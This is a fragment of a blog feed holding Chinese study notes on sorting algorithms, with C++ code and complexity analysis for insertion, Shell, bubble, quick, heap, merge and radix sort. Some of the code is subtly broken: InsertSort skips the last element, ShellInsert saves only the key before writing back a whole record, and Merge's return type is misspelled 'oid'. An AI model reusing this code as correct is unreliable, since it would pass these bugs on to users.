        <content type="html"><![CDATA[<h3 id="排序概述"><a href="#排序概述" class="headerlink" title="排序概述"></a>排序概述</h3><h4 id="排序方法的稳定性"><a href="#排序方法的稳定性" class="headerlink" title="排序方法的稳定性"></a>排序方法的稳定性</h4><p>当需要排序的关键字都不相同时，排序的结果是唯一的</p><p>当排序的关键字中存在相同的情况时，排序结果不唯一</p><p>在排序前后，含相等关键字的记录的相对位置保持不变，称这种排序方法是稳定的，反之，含相等关键字的记录的相对位置有可能改变，则称这种排序方法不稳定。</p><h4 id="内部排序和外部排序"><a href="#内部排序和外部排序" class="headerlink" title="内部排序和外部排序"></a>内部排序和外部排序</h4><p>在排序过程中，只使用计算机的内存存放排序记录，称这种排序为内部排序；</p><p>排序期间文件的全部记录不能同时存放在内存中，要借助计算机的外存才能完成排序，称为外部排序</p><p>内外存之间的数据交换次数是影响外部排序速度的主要因素</p><h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 1000 <span class="comment">//待排顺序表最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">  <span class="type">char</span> data;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">        KeyType key;<span class="comment">//关键字 整型类型</span></span><br><span class="line">        InfoType otherinfo;<span class="comment">//其他数据项</span></span><br><span class="line">&#125;RcdType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    RcdType r[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure><h4 id="排序方法的效率分析"><a href="#排序方法的效率分析" class="headerlink" title="排序方法的效率分析"></a>排序方法的效率分析</h4><p>1.时间复杂度：关键字的比较次数和记录移动次数</p><p>2.空间复杂度：执行算法所需的附加存储空间</p><p>3.稳定算法和不稳定算法</p><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><h4 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h4><p>从第二个记录开始排序</p><p>经过第i趟排序，前i+1个记录有序</p><h5 id="算法概述"><a href="#算法概述" class="headerlink" title="算法概述"></a>算法概述</h5><p>1.将序列中的第一个记录看成是一个有序的子序列</p><p>2.从第二个记录起按关键字大小逐个进行插入，直至整个序列变成按关键字有序序列为止</p><p>从第二个记录到第n个记录，共n-1趟</p><h5 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i<span class="number">-1</span>].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            <span class="keyword">for</span>(j=i<span class="number">-1</span>;L.r[<span class="number">0</span>].key&lt;L.r[j].key;--j)&#123;</span><br><span class="line">                L.r[j+<span class="number">1</span>]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+<span class="number">1</span>]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//插入排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析"><a href="#算法分析" class="headerlink" title="算法分析"></a>算法分析</h5><p>该算法在原序列呈正序排列时最省时间；在反序排列时最费时间</p><p>最好的情况</p><p>比较次数$\sum_{i=1}^{n-1} 1=n-1$    移动次数：0</p><p>最坏的情况</p><p>比较次数$\sum_{i=2}^{n} i=(n+2)(n-1)/2$     移动次数：$\sum_{i=2}^n (i+1)=(n+4)(n-1)/2$</p><p>平均$O(n^2)$</p><p>直接插入排序是<strong>稳定的</strong>排序方法</p><p>算法效率：</p><p>时间复杂度</p><p>最好情况：比较$O(n)$，移动$O(1)$</p><p>最坏情况：比较$O(n^2)$，移动$O(n^2)$</p><p>平均$O(n^2)$</p><p>空间复杂度：$O(1)$</p><h4 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h4><p>采用的是折半查找在有序区找到插入的位置</p><h5 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BiInsertSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,low,high,mid;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=L.length;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i<span class="number">-1</span>].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            low=<span class="number">1</span>;high=i<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">                mid=(low+high)/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span>(L.r[<span class="number">0</span>].key&lt;L.r[mid].key)&#123;</span><br><span class="line">                    high=mid<span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    low=mid+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(j=i<span class="number">-1</span>;j&gt;=high+<span class="number">1</span>;--j)&#123;</span><br><span class="line">                L.r[j+<span class="number">1</span>]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+<span class="number">1</span>]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//折半插入</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-1"><a href="#算法分析-1" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：折半插入排序是稳定的排序</p><p>2.算法效率：</p><p>时间复杂度：平均$O(n^2)$</p><p>空间复杂度：$O(1)$</p><h4 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h4><h5 id="算法概述-1"><a href="#算法概述-1" class="headerlink" title="算法概述"></a>算法概述</h5><p>1.将记录序列分为若干子序列，分别对每个子序列进行插入排序 将n个记录分成d个子序列</p><p>2.d称为增量，在排序过程中逐渐减小，直至最后一趟排序减为1</p><h5 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellInsert</span><span class="params">(SqList &amp;L,<span class="type">int</span> dk)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=dk+<span class="number">1</span>;i&lt;=L.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(L.r[i].key&lt;L.r[i-dk].key)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>].key=L.r[i].key;</span><br><span class="line">            <span class="keyword">for</span>(j=i-dk;j&gt;<span class="number">0</span>&amp;&amp;L.r[<span class="number">0</span>].key&lt;L.r[j].key;j-=dk)&#123;</span><br><span class="line">                L.r[j+dk]=L.r[j];</span><br><span class="line">            &#125;</span><br><span class="line">            L.r[j+dk]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span><span class="params">(SqList &amp;L,<span class="type">int</span> dlta[],<span class="type">int</span> t )</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;t;k++)&#123;</span><br><span class="line">        <span class="built_in">ShellInsert</span>(L, dlta[k]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//希尔排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-2"><a href="#算法分析-2" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：希尔排序是不稳定的排序方法、</p><p>2.算法效率：</p><p>时间复杂度平均$O(n^{1.3})$到平均$O(n^{1.5})$</p><p>空间复杂度：$O(1)$</p><h4 id="起泡排序"><a href="#起泡排序" class="headerlink" title="起泡排序"></a>起泡排序</h4><h5 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h5><p>1.从第一个记录开始两两比较记录的关键字，若L.r[i].key&gt;L.r[i+1].key,则将两个记录交换</p><p>2.第一趟比较结构将序列中关键字最大的记录放到最后一个位置，而最小的上浮一个位置</p><p>3.n个记录比较n-1趟</p><h5 id="算法实现-3"><a href="#算法实现-3" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BubbleSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,noswap;RcdType temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=L.length<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        noswap=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=L.length<span class="number">-1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(L.r[j].key&gt;L.r[j+<span class="number">1</span>].key)&#123;</span><br><span class="line">                temp=L.r[j];</span><br><span class="line">                L.r[j]=L.r[j+<span class="number">1</span>];</span><br><span class="line">                L.r[j+<span class="number">1</span>]=temp;</span><br><span class="line">                noswap=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(noswap)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//起泡排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-3"><a href="#算法分析-3" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：起泡排序是稳定的排序方法</p><p>2.时间复杂性</p><p>最好情况：比较$O(n)$，移动$O(1)$</p><p>最坏情况：比较$O(n^2)$，移动$O(n^2)$</p><p>平均情况：$O(n^2)$</p><p>3.空间复杂性：$O(1)$</p><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><h5 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h5><p>任取待排序列中的某个对象v，以它关键字大小为基准将整个序列分为左右两个子序列：</p><p>左侧子序列中所有对象的关键字都小于或等于对象v的关键字</p><p>右侧子序列中所有对象的关键字都大于或等于对象v的关键字</p><p>对象v则排在这两个子序列中间（最终位置）</p><h5 id="算法实现-4"><a href="#算法实现-4" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Partition</span><span class="params">(SqList &amp;L,<span class="type">int</span> low,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    KeyType pivotkey;</span><br><span class="line">    L.r[<span class="number">0</span>]=L.r[low];<span class="comment">//枢轴元素记录在r[0]</span></span><br><span class="line">    pivotkey=L.r[low].key;</span><br><span class="line">    RcdType temp;</span><br><span class="line">    <span class="keyword">while</span> (low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high&amp;&amp;(L.r[high].key&gt;=pivotkey))</span><br><span class="line">            --high;</span><br><span class="line">      L.r[low]=L.r[high];</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high&amp;&amp;L.r[low].key&lt;=pivotkey)</span><br><span class="line">            ++low;</span><br><span class="line">      L.r[high]=L.r[low];</span><br><span class="line">    &#125;</span><br><span class="line">    L.r[low]=L.r[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> low;</span><br><span class="line">&#125;<span class="comment">//返回枢轴位置</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">QSort</span><span class="params">(SqList &amp;L,<span class="type">int</span> low,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> pivotloc;</span><br><span class="line">    <span class="keyword">if</span>(low&lt;high)&#123;</span><br><span class="line">        pivotloc=<span class="built_in">Partition</span>(L, low, high);</span><br><span class="line">        <span class="built_in">QSort</span>(L, low, pivotloc<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">QSort</span>(L, pivotloc+<span class="number">1</span>, high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//快速排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-4"><a href="#算法分析-4" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.稳定性：快速排序不稳定</p><p>2.算法效率</p><p>最坏情况：时间复杂度$O(n^2)$，空间复杂度$O(n)$</p><p>最好情况：时间复杂度$O(nlog_2n)$，空间复杂度$O(log_2n)$</p><p>对于时间复杂性的最好情况来说，每次选择的基准是把左右分为相等的两部分；</p><p>最好情况的时间复杂度为$O(nlog_2n)$</p><p>平均时间复杂度也是$O(nlog_2n)$</p><h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><h5 id="算法思想-2"><a href="#算法思想-2" class="headerlink" title="算法思想"></a>算法思想</h5><p>1.第一次从个关键字中选择一个最小值，确定第一个；</p><p>2.第二次从剩余元素中再选择一个最小值，确定第二个</p><p>3.共n-1次选择</p><h5 id="算法实现-5"><a href="#算法实现-5" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SelectSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,low;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">        low=i;</span><br><span class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;=L.length;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(L.r[j].key&lt;L.r[low].key)&#123;</span><br><span class="line">                low=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i!=low)&#123;</span><br><span class="line">            L.r[<span class="number">0</span>]=L.r[i];</span><br><span class="line">            L.r[i]=L.r[low];</span><br><span class="line">            L.r[low]=L.r[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//选择排序</span></span><br></pre></td></tr></table></figure><h4 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h4><h5 id="算法思想-3"><a href="#算法思想-3" class="headerlink" title="算法思想"></a>算法思想</h5><p>堆排序属于选择排序，出发点是利用选择排序已经发生过的比较，记住比较的结果，减少重复比较的次数。</p><p>堆的定义：</p><p>n个元素的关键字序列A[1].key，A[2].key，…，A[n].key,当且仅当满足下述关系时称为堆：</p><p>小根堆：</p><script type="math/tex; mode=display">\begin{cases}A[i].key \leqslant A[2*i].key \\且                           \\                                                    A[i].key \leqslant A[2*i+1].key\end{cases}</script><p>大根堆：</p><script type="math/tex; mode=display">\begin{cases}A[i].key \geqslant A[2*i].key \\且                           \\                                                    A[i].key \geqslant A[2*i+1].key\end{cases}</script><p>堆是一棵采用顺序存储结构的完全二叉树</p><p>堆的根结点是关键字序列中的最小（或最大）值，分别称为小（或大）根堆</p><p>堆排序需要解决的问题：</p><p>1.由一个无需序列建成一个堆</p><p>2.输出堆顶元素后，调整剩余的元素称为一个新的堆</p><h5 id="算法概要（采用大根堆）"><a href="#算法概要（采用大根堆）" class="headerlink" title="算法概要（采用大根堆）"></a>算法概要（采用大根堆）</h5><p>1.按关键字建立A[1],A[2],…,A[n]的大根堆</p><p>2.输出堆顶元素，采用堆顶元素A[1]与最后一个元素A[n]交换，最大元素得到正确的排序位置</p><p>3.此时，前n-1个元素不再满足堆的特性，需要重建堆</p><p>4.循坏执行2，3到排序完成</p><h5 id="算法实现-6"><a href="#算法实现-6" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">HeapType</span>&#123;</span><br><span class="line">    RcdType r[MAXSIZE+<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapAdjust</span><span class="params">(HeapType &amp;H,<span class="type">int</span> s,<span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    RcdType rc;</span><br><span class="line">    rc=H.r[s];</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">2</span>*s;j&lt;=m;j*=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j&lt;m&amp;&amp;H.r[j].key&lt;H.r[j+<span class="number">1</span>].key)</span><br><span class="line">            ++j;</span><br><span class="line">        <span class="keyword">if</span>(rc.key&gt;=H.r[j].key) <span class="keyword">break</span>;</span><br><span class="line">        H.r[s]=H.r[j];</span><br><span class="line">        s=j;</span><br><span class="line">    &#125;</span><br><span class="line">    H.r[s]=rc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSort</span><span class="params">(HeapType &amp;H)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    RcdType temp;</span><br><span class="line">    <span class="keyword">for</span>(i=H.length/<span class="number">2</span>;i&gt;<span class="number">0</span>;--i)&#123;</span><br><span class="line">        <span class="built_in">HeapAdjust</span>(H, i, H.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=H.length;i&gt;<span class="number">1</span>;--i)&#123;</span><br><span class="line">        temp=H.r[i];</span><br><span class="line">        H.r[i]=H.r[<span class="number">1</span>];</span><br><span class="line">        H.r[<span class="number">1</span>]=temp;</span><br><span class="line">        <span class="built_in">HeapAdjust</span>(H, <span class="number">1</span>, i<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//HeapSort</span></span><br></pre></td></tr></table></figure><p>总结：</p><p>1.将无序序列构成一个堆</p><p>2.将堆顶元素与末尾元素交换，将最大元素沉到数组末端</p><p>3.重新调整结构，并继续调整+交换</p><h5 id="算法分析-5"><a href="#算法分析-5" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.堆排序是不稳定的排序</p><p>2.时间复杂度为：$O(nlog_2n)$</p><p>3.空间复杂度：$O(1)$</p><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><p>将两多个有序表合成一个新的有序表</p><h5 id="算法实现-7"><a href="#算法实现-7" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">oid <span class="title">Merge</span><span class="params">(RcdType SR[], RcdType TR[], <span class="type">int</span> i, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> j, k;</span><br><span class="line">    <span class="keyword">for</span> (j = m + <span class="number">1</span>, k = i; i &lt;= m &amp;&amp; j &lt;= n; ++k) &#123;</span><br><span class="line">        <span class="keyword">if</span> (SR[i].key &lt; SR[j].key) TR[k] = SR[i++];</span><br><span class="line">        <span class="keyword">else</span> TR[k] = SR[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= m) TR[k++] = SR[i++];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= n) TR[k++] = SR[j++];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Msort</span><span class="params">(RcdType A[], RcdType B[], <span class="type">int</span> n, <span class="type">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>, t;</span><br><span class="line">    <span class="keyword">while</span> (i + <span class="number">2</span> * d - <span class="number">1</span> &lt;= n) &#123;</span><br><span class="line">        <span class="built_in">Merge</span>(A, B, i, i + d - <span class="number">1</span>, i + <span class="number">2</span> * d - <span class="number">1</span>);</span><br><span class="line">        i = i + <span class="number">2</span> * d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i + d - <span class="number">1</span> &lt;= n) &#123;</span><br><span class="line">        <span class="built_in">Merge</span>(A, B, i, i + d - <span class="number">1</span>, n);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (t = i; t &lt;= n; t++) &#123;</span><br><span class="line">            B[t] = A[t];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(RcdType A[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> d = <span class="number">1</span>;</span><br><span class="line">    RcdType *B = (RcdType *)<span class="built_in">malloc</span>((n + <span class="number">1</span>) * <span class="built_in">sizeof</span>(RcdType));</span><br><span class="line">    <span class="keyword">while</span> (d &lt; n) &#123;</span><br><span class="line">        <span class="built_in">Msort</span>(A, B, n, d);</span><br><span class="line">        d = <span class="number">2</span> * d;</span><br><span class="line">        <span class="built_in">Msort</span>(B, A, n, d);</span><br><span class="line">        d = <span class="number">2</span> * d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">&#125;<span class="comment">//归并排序</span></span><br></pre></td></tr></table></figure><h5 id="算法分析-6"><a href="#算法分析-6" class="headerlink" title="算法分析"></a>算法分析</h5><p>1.归并排序是稳定的排序方法</p><p>2.时间复杂度$nlog_2n$</p><p>3.空间复杂度$O(n)$</p><h4 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h4><p>基数排序起源于桶排序，把关键词为k的记录放在第k个箱子里，按按序号将非空的记录收集起来</p><p>缺点是：如果关键字位数太大这样做空间复杂性和时间复杂性都大大提高</p><h5 id="算法实现-8"><a href="#算法实现-8" class="headerlink" title="算法实现"></a>算法实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">records</span>&#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">celltype</span>&#123;</span><br><span class="line">    records data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QUEUE</span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *front;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">celltype</span> *rear;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MAKENULL</span><span class="params">(QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    Q.front=Q.rear=(celltype*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(celltype));</span><br><span class="line">    <span class="keyword">if</span>(!Q.front)&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Q.front-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">records <span class="title">FRONT</span><span class="params">(QUEUE Q)</span></span>&#123;</span><br><span class="line">    records e;</span><br><span class="line">    e.key=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (Q.front-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        celltype* p= Q.front-&gt;next;</span><br><span class="line">        e.key=p-&gt;data.key;</span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">EMPTY</span><span class="params">(QUEUE Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ENQUEUE</span><span class="params">(records e,QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    celltype* p;</span><br><span class="line">    p=(celltype*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(celltype));</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;data=e;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    Q.rear-&gt;next=p;</span><br><span class="line">    Q.rear=p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DEQUEUE</span><span class="params">(QUEUE &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ERROR.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    celltype *p;</span><br><span class="line">    p=Q.front-&gt;next;</span><br><span class="line">    <span class="comment">//e=p-&gt;data;</span></span><br><span class="line">    Q.front-&gt;next=p-&gt;next;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q.rear=Q.front;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;DeQueue succeed.&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RADIX</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">int</span>)(k/<span class="built_in">pow</span>(<span class="number">10</span>,p<span class="number">-1</span>))%<span class="number">10</span>);</span><br><span class="line">&#125;<span class="comment">//求关键字k的第p位</span></span><br><span class="line"><span class="comment">//个：k%10</span></span><br><span class="line"><span class="comment">//十：k/10%10</span></span><br><span class="line"><span class="comment">//百：k/100%10</span></span><br><span class="line"><span class="comment">//千：k/1000%10</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">radixsort</span><span class="params">(<span class="type">int</span> figure,QUEUE &amp;A)</span></span>&#123;</span><br><span class="line">    QUEUE Q[<span class="number">10</span>];</span><br><span class="line">    records data;</span><br><span class="line">    <span class="type">int</span> pass,r,i;</span><br><span class="line">    <span class="keyword">for</span>(pass=<span class="number">1</span>;pass&lt;=figure;pass++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;++i)&#123;</span><br><span class="line">            <span class="built_in">MAKENULL</span>(Q[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!<span class="built_in">EMPTY</span>(A))&#123;</span><br><span class="line">            data=<span class="built_in">FRONT</span>(A);</span><br><span class="line">            <span class="built_in">DEQUEUE</span>(A);</span><br><span class="line">            r=<span class="built_in">RADIX</span>(data.key,pass);</span><br><span class="line">            <span class="built_in">ENQUEUE</span>(data,Q[r]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!<span class="built_in">EMPTY</span>(Q[i]))&#123;</span><br><span class="line">                data=<span class="built_in">FRONT</span>(Q[i]);</span><br><span class="line">                <span class="built_in">DEQUEUE</span>(Q[i]);</span><br><span class="line">                <span class="built_in">ENQUEUE</span>(data, A);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//基数排序</span></span><br></pre></td></tr></table></figure><h3 id="排序方法比较"><a href="#排序方法比较" class="headerlink" title="排序方法比较"></a>排序方法比较</h3><p><img src="/2023/11/23/排序方法比较.png" alt="排序方法比较"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【数据结构】 串</title>
      <link href="/2023/11/23/"/>
      <url>/2023/11/23/</url>
      
